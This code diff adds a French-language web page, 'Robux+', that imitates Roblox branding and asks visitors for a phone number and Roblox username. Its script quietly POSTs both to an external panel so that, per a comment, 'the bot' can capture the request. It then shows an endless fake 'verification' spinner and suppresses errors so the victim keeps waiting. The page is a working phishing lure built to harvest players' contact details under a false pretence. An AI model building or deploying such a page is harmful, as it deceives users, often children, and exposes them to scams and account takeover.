@@ -1,0 +1,104 @@
+<!doctype html>
+<html lang="fr">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Robux+</title>
+    <style>
+      :root { --bg1:#0ea5e9; --bg2:#0d9488; --btn:#16a34a; --btn2:#0d9241; }
+      html,body{height:100%;}
+      body{margin:0; font-family:system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, Arial; background: radial-gradient(900px 700px at 20% 0%, rgba(255,255,255,.12), transparent 60%), radial-gradient(900px 700px at 80% 100%, rgba(255,255,255,.12), transparent 60%), linear-gradient(135deg,var(--bg1),var(--bg2)); display:flex; align-items:center; justify-content:center;}
+      .card{width:420px; max-width:92vw; background:#fff; border-radius:20px; padding:28px; box-shadow:0 30px 70px rgba(0,0,0,.25);}      
+      .logo{width:64px; height:64px; background:#ffffff; border-radius:16px; display:flex; align-items:center; justify-content:center; margin:0 auto 16px; box-shadow:0 10px 25px rgba(15,23,42,.2), 0 0 0 1px #e5e7eb inset;} 
+      .logo svg{width:38px; height:38px; display:block;}
+      h1{margin:0 0 6px; text-align:center; font-size:36px;}
+      .subtitle{color:#6b7280; text-align:center; margin-bottom:18px;}
+      .field{position:relative; margin:14px 0;}
+      .input{width:100%; padding:14px 16px; border:1px solid #e5e7eb; border-radius:12px; font-size:16px; outline:none; transition:border .2s, box-shadow .2s; box-sizing: border-box; display:block;}
+      .input:focus{border-color:#a5b4fc; box-shadow:0 0 0 4px rgba(165,180,252,.35);} 
+      .flag{position:absolute; left:12px; top:50%; transform:translateY(-50%); display:flex; overflow:hidden; border-radius:2px; width:18px; height:12px; box-shadow:0 0 0 1px #e5e7eb inset;}
+      .flag span{flex:1 0 0}
+      .flag .b{background:#0055A4}
+      .flag .w{background:#ffffff}
+      .flag .r{background:#EF4135}
+      .phone{padding-left:46px;}
+      .btn{width:100%; padding:14px 16px; background:linear-gradient(180deg,var(--btn),var(--btn2)); color:#fff; border:none; border-radius:12px; font-weight:800; cursor:pointer; margin-top:6px;}
+      .hint{color:#ef4444; font-size:13px; display:none; margin-top:6px;}
+      /* Ecran de vérification */
+      #verify{position:fixed; inset:0; display:none; align-items:center; justify-content:center;}
+      .verify-card{width:520px; max-width:92vw; background:#fff; border-radius:20px; padding:36px; box-shadow:0 30px 70px rgba(0,0,0,.25); text-align:center;}
+      .spinner{width:54px; height:54px; border-radius:50%; border:6px solid #e5e7eb; border-top-color:#9ca3af; margin:0 auto 16px; animation:spin 1s linear infinite;}
+      @keyframes spin{to{transform:rotate(360deg);}}
+    </style>
+  </head>
+  <body>
+    <main class="card" aria-label="Demande Robux">
+      <div class="logo" aria-hidden="true">
+        <!-- Logo style Roblox (carré incliné avec trou) -->
+        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" role="img">
+          <rect x="10" y="10" width="28" height="28" rx="4" fill="#111827" transform="rotate(45 24 24)"/>
+          <rect x="20" y="20" width="8" height="8" rx="1.5" fill="#ffffff" transform="rotate(45 24 24)"/>
+        </svg>
+      </div>
+      <h1>Robux+</h1>
+      <div class="subtitle">Accédez à votre compte Roblox</div>
+
+      <div class="field">
+        <span class="flag" aria-hidden="true"><span class="b"></span><span class="w"></span><span class="r"></span></span>
+        <input id="phone" class="input phone" type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="10" placeholder="Numéro de téléphone" autocomplete="tel" />
+      </div>
+
+      <div class="field">
+        <input class="input" type="text" placeholder="Nom d'utilisateur Roblox" autocomplete="username" />
+      </div>
+
+      <button id="go" class="btn">Suivant</button>
+      <div id="err" class="hint">Le numéro doit contenir uniquement des chiffres (10 max).</div>
+    </main>
+    <section id="verify">
+      <div class="verify-card">
+        <div class="spinner" aria-hidden="true"></div>
+        <div style="color:#6b7280">Vérification en cours...</div>
+      </div>
+    </section>
+    <script>
+      const phone = document.getElementById('phone');
+      const err = document.getElementById('err');
+      const go = document.getElementById('go');
+      const main = document.querySelector('main.card');
+      const verify = document.getElementById('verify');
+
+      function sanitize() {
+        const before = phone.value;
+        phone.value = before.replace(/\D/g, '').slice(0, 10);
+      }
+      phone.addEventListener('input', sanitize);
+      phone.addEventListener('paste', (e) => { setTimeout(sanitize, 0); });
+      go.addEventListener('click', async () => {
+        const validPhone = /^\d{10}$/.test(phone.value);
+        const usernameInput = document.querySelector('.field + .field .input');
+        const validUser = usernameInput && usernameInput.value.trim().length > 0;
+        if (!validPhone || !validUser) {
+          err.style.display = 'block';
+        } else {
+          err.style.display = 'none';
+          // Afficher l'écran de vérification et rester dessus
+          main.style.display = 'none';
+          verify.style.display = 'flex';
+          // Envoi des infos vers le panel pour que le bot capte la demande
+          try {
+            await fetch('https://panel-robux-social.vercel.app/api/requests', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ phone: phone.value, username: usernameInput.value.trim() })
+            });
+          } catch (e) {
+            // on ignore volontairement, l'écran de vérification reste affiché
+          }
+        }
+      });
+    </script>
+  </body>
+  </html>
+
+
